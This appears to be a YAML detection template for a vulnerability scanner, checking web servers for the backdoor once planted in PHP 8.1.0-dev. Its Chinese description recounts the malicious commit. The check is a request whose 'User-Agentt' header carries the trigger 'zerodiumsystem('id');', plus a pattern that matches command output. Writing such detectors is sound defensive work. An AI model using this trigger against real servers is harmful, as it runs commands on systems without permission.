expression: r0()
id: php-zerodium-backdoor
info:
  author: zan8in
  description: "PHP\u5F00\u53D1\u5DE5\u7A0B\u5E08Jake Birchall\u5728\u5BF9\u5176\u4E2D\
    \u4E00\u4E2A\u6076\u610FCOMMIT\u7684\u5206\u6790\u8FC7\u7A0B\u4E2D\u53D1\u73B0\
    \uFF0C\u5728\u4EE3\u7801\u4E2D\u6CE8\u5165\u7684\u540E\u95E8\u662F\u6765\u81EA\
    \u4E00\u4E2APHP\u4EE3\u7801\u88AB\u52AB\u6301\u7684\u7F51\u7AD9\u4E0A\uFF0C\u5E76\
    \u4E14\u91C7\u7528\u4E86\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u7684\u64CD\u4F5C\
    \uFF0C\u5E76\u4E14\u653B\u51FB\u8005\u76D7\u7528\u4E86PHP\u5F00\u53D1\u4EBA\u5458\
    \u7684\u540D\u4E49\u6765\u63D0\u4EA4\u6B64COMMIT\u3002\n\u76EE\u524D\u4E3A\u6B62\
    PHP\u5B98\u65B9\u5E76\u672A\u5C31\u8BE5\u4E8B\u4EF6\u8FDB\u884C\u66F4\u591A\u62AB\
    \u9732\uFF0C\u8868\u793A\u6B64\u6B21\u670D\u52A1\u5668\u88AB\u9ED1\u7684\u5177\
    \u4F53\u7EC6\u8282\u4ECD\u5728\u8C03\u67E5\u5F53\u4E2D\u3002\u7531\u4E8E\u6B64\
    \u4E8B\u4EF6\u7684\u5F71\u54CD\uFF0CPHP\u7684\u5B98\u65B9\u4EE3\u7801\u5E93\u5DF2\
    \u7ECF\u88AB\u7EF4\u62A4\u4EBA\u5458\u8FC1\u79FB\u81F3GitHub\u5E73\u53F0\uFF0C\
    \u4E4B\u540E\u7684\u76F8\u5173\u4EE3\u7801\u66F4\u65B0\u3001\u4FEE\u6539\u5C06\
    \u4F1A\u90FD\u5728GitHub\u4E0A\u8FDB\u884C\n\"PHP/8.1.0-dev\"\n"
  name: "PHP zerodium\u540E\u95E8\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/language/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E.html
  severity: critical
rules:
  r0:
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
    request:
      headers:
        User-Agentt: zerodiumsystem('id');
      method: GET
      path: /
